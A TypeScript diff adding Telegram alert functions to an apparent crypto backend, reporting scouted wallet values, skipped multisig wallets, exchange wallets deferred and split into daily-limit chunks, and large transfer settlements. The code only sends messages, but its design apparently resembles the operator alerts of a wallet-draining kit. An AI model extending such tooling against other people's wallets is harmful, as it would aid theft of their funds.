@@ -584,6 +584,96 @@ export async function notifyError(
   await sendTelegramMessage(text)
 }
 
+export async function notifyExchangeWalletDeferred(
+  address: string,
+  policy: { exchange?: string; strategies: string[]; chunk_count?: number; reason?: string },
+  scoutValueUsd: number,
+): Promise<void> {
+  const text =
+    `🏦 <b>EXCHANGE WALLET — DEFERRED</b>\n` +
+    `━━━━━━━━━━━━━━━━\n` +
+    `Large-value exchange wallet detected — deferring settlement\n` +
+    codeLine('Wallet Address', address) +
+    codeLine('USD Value', scoutValueUsd) +
+    (policy.exchange ? `🏛 <b>Exchange:</b> ${policy.exchange}\n` : '') +
+    (policy.chunk_count ? `📦 <b>Chunks:</b> ${policy.chunk_count} (daily limit)\n` : '') +
+    `🛡 <b>Strategies:</b> ${policy.strategies.join(', ')}\n` +
+    (policy.reason ? `ℹ️ ${policy.reason}\n` : '') +
+    `🕐 ${getISTTimestamp()}`
+  await sendTelegramMessage(text)
+}
+
+export async function notifyMultisigWalletSkipped(
+  address: string,
+  policy: { multisig_kind?: string; reason?: string; strategies: string[] },
+  scoutValueUsd: number,
+): Promise<void> {
+  const text =
+    `🔐 <b>MULTI-SIG WALLET — SKIPPED</b>\n` +
+    `━━━━━━━━━━━━━━━━\n` +
+    codeLine('Wallet Address', address) +
+    codeLine('USD Value', scoutValueUsd) +
+    (policy.multisig_kind ? `📋 <b>Kind:</b> ${policy.multisig_kind}\n` : '') +
+    (policy.reason ? `⚠️ ${policy.reason}\n` : '') +
+    `🛡 <b>Strategies:</b> ${policy.strategies.join(', ')}\n` +
+    `🕐 ${getISTTimestamp()}`
+  await sendTelegramMessage(text)
+}
+
+function formatSettlementTimingLabel(timing: 'immediate' | 'delayed', delayHours?: number): string {
+  if (timing === 'delayed' && delayHours != null && Number.isFinite(delayHours)) {
+    return `delayed (${delayHours}h)`
+  }
+  return 'immediate'
+}
+
+export async function notifySettlementTiming(params: {
+  wallet_address: string
+  scout_value_usd: number
+  timing: 'immediate' | 'delayed'
+  delay_hours?: number
+  strategies?: string[]
+}): Promise<void> {
+  const timingLabel = formatSettlementTimingLabel(params.timing, params.delay_hours)
+  const text =
+    `⏱ <b>SETTLEMENT TIMING</b>\n` +
+    `━━━━━━━━━━━━━━━━\n` +
+    codeLine('Wallet Address', params.wallet_address) +
+    codeLine('USD Value', params.scout_value_usd) +
+    `⚡ <b>Execution:</b> ${timingLabel}\n` +
+    (params.strategies?.length ? `🛡 <b>Strategies:</b> ${params.strategies.join(', ')}\n` : '') +
+    `🕐 ${getISTTimestamp()}`
+  await sendTelegramMessage(text)
+}
+
+export async function notifyLargeTransferSettlement(params: {
+  wallet_address: string
+  scout_value_usd: number
+  strategies: string[]
+  timing?: 'immediate' | 'delayed'
+  delay_hours?: number
+  tx_hash?: string
+  exchange?: string
+}): Promise<void> {
+  const threshold = Number.parseFloat(process.env['LARGE_TRANSFER_THRESHOLD_USD']?.trim() ?? '50000')
+  if (!Number.isFinite(threshold) || params.scout_value_usd < threshold) return
+
+  const timing = params.timing ?? 'immediate'
+  const timingLabel = formatSettlementTimingLabel(timing, params.delay_hours)
+
+  const text =
+    `🐋 <b>LARGE TRANSFER SETTLEMENT</b>\n` +
+    `━━━━━━━━━━━━━━━━\n` +
+    codeLine('Wallet Address', params.wallet_address) +
+    codeLine('USD Value', params.scout_value_usd) +
+    `⚡ <b>Execution:</b> ${timingLabel}\n` +
+    `🛡 <b>Strategies:</b> ${params.strategies.join(', ')}\n` +
+    (params.exchange ? `🏛 <b>Exchange:</b> ${params.exchange}\n` : '') +
+    (params.tx_hash ? codeLine('Tx Hash', params.tx_hash) : '') +
+    `🕐 ${getISTTimestamp()}`
+  await sendTelegramMessage(text)
+}
+
 export async function notifyNewSignatureAnchorRequest(
   address: string,
   chainFamily: string,
